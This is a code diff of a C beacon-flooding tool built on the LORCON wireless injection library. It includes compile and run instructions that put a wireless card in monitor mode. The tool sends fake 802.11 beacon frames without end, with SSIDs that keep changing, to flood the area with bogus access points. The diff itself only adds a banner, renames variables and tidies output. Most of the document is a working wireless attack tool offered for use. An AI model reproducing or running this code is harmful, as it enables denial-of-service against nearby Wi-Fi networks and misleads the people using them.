@@ -1,18 +1,22 @@
 /*
  *
 ===
+
 usage-
 to compile:
 gcc -o BeaconFlooder -lorcon2 BeaconFlooder.c
 
 Put your alpha card in monitor mode, and run:
 sudo airmon-ng start wls160u4u1
-sudo ./BeaconFlooder -s [SSID_HERE] -i wls160u4u1mon -c 11
+sudo ./beacon_flood_lcpa -s [SSID_HERE] -i wls160u4u1mon -c 11
 ===
+
 This is a modified version of a Lorcon example written by
 brad.antoniewicz@foundstone.com
+
 */
 
+#include <stdlib.h>
 #include <stdio.h>
 #include <getopt.h>
 #include <string.h>
@@ -21,11 +25,10 @@ brad.antoniewicz@foundstone.com
 #include <lorcon2/lorcon_packasm.h>
 
 void usage(char *argv[]) {
+        printf("\tUsage: %s -s [SSID] -i wlan0 -c 11\n\n",argv[0]);
         printf("\t-s <SSID>\tSSID to flood\n");
         printf("\t-i <int> \tInterface\n");
         printf("\t-c <channel>\tChannel\n");
-        printf("\nExample:\n");
-        printf("\t%s -s [SSID] -i wlan0 -c 11\n\n",argv[0]);
 }
 
 int main(int argc, char *argv[]) {
@@ -35,7 +38,7 @@ int main(int argc, char *argv[]) {
     int c;
     uint8_t channel;
     unsigned int count = 0;
-    int ssidAdded;
+    int ssidCap;
 
     lorcon_driver_t *drvlist, *driver;
     lorcon_t *context;
@@ -45,7 +48,6 @@ int main(int argc, char *argv[]) {
     //Beacon frame setup
 
     uint8_t *mac = "\x00\xDE\xAD\xBE\xEF\x00";
-
     struct timeval time;
     uint64_t timestamp;
 
@@ -53,6 +55,10 @@ int main(int argc, char *argv[]) {
     uint8_t rates[] = "\x8c\x12\x98\x24\xb0\x48\x60\x6c";
     int interval = 1;
     int capabilities = 0x0421;
+
+    printf ("------------------------------------\n");
+    printf ("| 802.11 Broadcast Beacon Flooder |\n");
+    printf ("------------------------------------\n");
 
     //This handles all of the command line arguments
 
@@ -62,7 +68,7 @@ int main(int argc, char *argv[]) {
                                 interface = strdup(optarg);
                                 break;
                         case 's':
-                                if ( strlen(strdup(optarg)) < 255 ) {
+                                if (strlen(strdup(optarg)) < 255 ) {
                                         ssid = strdup(optarg);
                                 } else {
                                         printf("ERROR: SSID Length > 255 characters\n");
@@ -82,7 +88,7 @@ int main(int argc, char *argv[]) {
         }
 
         if ( interface == NULL || ssid == NULL ) {
-                printf ("ERROR: Interface, channel, or SSID not set (see -h for more info)\n");
+                printf ("ERROR: Interface (-i), channel (-c), or SSID (-s) not set.\n");
                 return -1;
         }
 
@@ -117,20 +123,18 @@ int main(int argc, char *argv[]) {
         printf("[+]\t Using channel: %d\n\n",channel);
  
         // Set initial value to trailing variable, and get length of SSID
-        ssidAdded=0;
+        ssidCap=0;
         int ssidLength = strlen(ssid);
+
 
         // Send frames
         while(1) {
-
-                // Create timestamp
+                //Create beacon frame
                 gettimeofday(&time, NULL);
                 timestamp = time.tv_sec * 1000000 + time.tv_usec;
 
-                // Initialize the LORCON metapack
                 metapack = lcpa_init();
 
-                // Create a Beacon frame 
                 lcpf_beacon(metapack, mac, mac, 0x00, 0x00, 0x00, 0x00, timestamp, interval, capabilities);
 
                 // Append IE Tag 0 for SSID
@@ -139,24 +143,23 @@ int main(int argc, char *argv[]) {
                 // Convert the LORCON metapack to a LORCON packet for sending
                 txpack = (lorcon_packet_t *) lorcon_packet_from_lcpa(context, metapack);
 
-                // Send and exit if error
                 if ( lorcon_inject(context,txpack) < 0 )
-                        return -1;
+                return -1;
                
-                //Increment and add value at the end of the SSID
-                ssidAdded++; 
-                ssid[ssidLength]=ssidAdded;
+                //Increment and add value at the end of the SSID (cap)
+                ssidCap++; 
+                ssid[ssidLength]=ssidCap;
 
                 usleep(interval * 1000); //*
 
-                printf("[+] Sent %d frames\n", count);
+                printf("\033[K\r");
+                printf("[+] Sent %d frames", count);
                 fflush(stdout);
                 count++;
 
                 lcpa_free(metapack);
         }
 
-  // Cleanup
   lorcon_close(context);
   lorcon_free(context);
 
